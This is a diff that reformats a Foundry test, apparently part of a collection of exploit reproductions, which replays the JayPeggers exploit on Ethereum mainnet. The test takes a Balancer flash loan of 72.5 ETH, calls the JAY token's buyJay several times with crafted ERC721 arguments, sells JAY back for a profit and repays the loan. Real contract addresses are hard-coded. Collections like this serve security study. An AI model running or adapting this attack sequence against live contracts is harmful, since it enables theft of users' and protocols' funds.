@@ -23,6 +23,7 @@ import {IERC20} from "src/interfaces/IERC20.sol";
 // Article Hypernative : https://www.hypernative.io/blog/jaypeggers-exploit
 
 interface IJay {
+
     function buyJay(
         address[] memory erc721TokenAddress,
         uint256[] memory erc721Ids,
@@ -32,14 +33,14 @@ interface IJay {
     ) external payable;
     function sell(uint256 value) external;
     function balanceOf(address account) external view returns (uint256);
+
 }
 
 contract ContractTest is Test {
+
     IJay constant JAY_TOKEN = IJay(0xf2919D1D80Aff2940274014bef534f7791906FF2);
-    IBalancerVault constant BALANCER_VAULT =
-        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-    IWETH constant WETH_TOKEN =
-        IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
+    IBalancerVault constant BALANCER_VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    IWETH constant WETH_TOKEN = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
     uint256 constant BORROWED_ETH = 72.5 ether;
 
     function setUp() public {
@@ -48,20 +49,13 @@ contract ContractTest is Test {
         vm.label(address(JAY_TOKEN), "JAY_TOKEN");
         vm.label(address(BALANCER_VAULT), "BALANCER_VAULT");
         vm.label(address(WETH_TOKEN), "WETH_TOKEN");
-        vm.label(
-            0xce88686553686DA562CE7Cea497CE749DA109f9F,
-            "BALANCER_ProtocolFeesCollector"
-        );
+        vm.label(0xce88686553686DA562CE7Cea497CE749DA109f9F, "BALANCER_ProtocolFeesCollector");
     }
 
     function testExploit() public {
         // "Clean" contract's balance
         payable(address(0)).transfer(address(this).balance);
-        emit log_named_decimal_uint(
-            "[Start] Attacker ETH balance before exploit",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint("[Start] Attacker ETH balance before exploit", address(this).balance, 18);
 
         // Setup flashloan parameters
         address[] memory tokens = new address[](1);
@@ -69,26 +63,22 @@ contract ContractTest is Test {
         uint256[] memory amounts = new uint256[](1);
         amounts[0] = BORROWED_ETH;
         // The following value for "b" was used in the original exploit, but it is actually not required here
-        bytes
-            memory b = "0x000000000000000000000000000000000000000000000001314fb37062980000000000000000000000000000000000000000000000000002bcd40a70853a000000000000000000000000000000000000000000000000000030927f74c9de00000000000000000000000000000000000000000000000000006f05b59d3b200000";
+        bytes memory b =
+            "0x000000000000000000000000000000000000000000000001314fb37062980000000000000000000000000000000000000000000000000002bcd40a70853a000000000000000000000000000000000000000000000000000030927f74c9de00000000000000000000000000000000000000000000000000006f05b59d3b200000";
 
         // Execute the flashloan. It will return the funds in the `receiveFlashLoan()` callback
         BALANCER_VAULT.flashLoan(address(this), tokens, amounts, b);
 
-        emit log_named_decimal_uint(
-            "[End] Attacker ETH balance after exploit",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint("[End] Attacker ETH balance after exploit", address(this).balance, 18);
     }
 
     /*
      * Callback function called by the Balancer Vault during the flashloan
      */
     function receiveFlashLoan(
-        IERC20[] memory /* tokens*/,
+        IERC20[] memory, /* tokens*/
         uint256[] memory amounts,
-        uint256[] memory /*feeAmounts*/,
+        uint256[] memory, /*feeAmounts*/
         bytes memory /*userData*/
     ) external {
         require(msg.sender == address(BALANCER_VAULT));
@@ -97,11 +87,7 @@ contract ContractTest is Test {
         WETH_TOKEN.withdraw(amounts[0]);
 
         JAY_TOKEN.buyJay{value: 22 ether}(
-            new address[](0),
-            new uint256[](0),
-            new address[](0),
-            new uint256[](0),
-            new uint256[](0)
+            new address[](0), new uint256[](0), new address[](0), new uint256[](0), new uint256[](0)
         );
 
         address[] memory erc721TokenAddress = new address[](1);
@@ -111,33 +97,19 @@ contract ContractTest is Test {
         erc721Ids[0] = 0;
 
         JAY_TOKEN.buyJay{value: 50.5 ether}(
-            erc721TokenAddress,
-            erc721Ids,
-            new address[](0),
-            new uint256[](0),
-            new uint256[](0)
+            erc721TokenAddress, erc721Ids, new address[](0), new uint256[](0), new uint256[](0)
         );
         JAY_TOKEN.sell(JAY_TOKEN.balanceOf(address(this)));
         JAY_TOKEN.buyJay{value: 3.5 ether}(
-            new address[](0),
-            new uint256[](0),
-            new address[](0),
-            new uint256[](0),
-            new uint256[](0)
+            new address[](0), new uint256[](0), new address[](0), new uint256[](0), new uint256[](0)
         );
         JAY_TOKEN.buyJay{value: 8 ether}(
-            erc721TokenAddress,
-            erc721Ids,
-            new address[](0),
-            new uint256[](0),
-            new uint256[](0)
+            erc721TokenAddress, erc721Ids, new address[](0), new uint256[](0), new uint256[](0)
         );
         JAY_TOKEN.sell(JAY_TOKEN.balanceOf(address(this)));
 
         // Repay the flashloan by depositing ETH for WETH and transferring it back to Balancer
-        (bool success, ) = address(WETH_TOKEN).call{value: BORROWED_ETH}(
-            "deposit"
-        );
+        (bool success,) = address(WETH_TOKEN).call{value: BORROWED_ETH}("deposit");
         require(success, "Deposit failed");
         WETH_TOKEN.transfer(address(BALANCER_VAULT), BORROWED_ETH);
     }
@@ -153,4 +125,5 @@ contract ContractTest is Test {
     }
 
     receive() external payable {}
+
 }
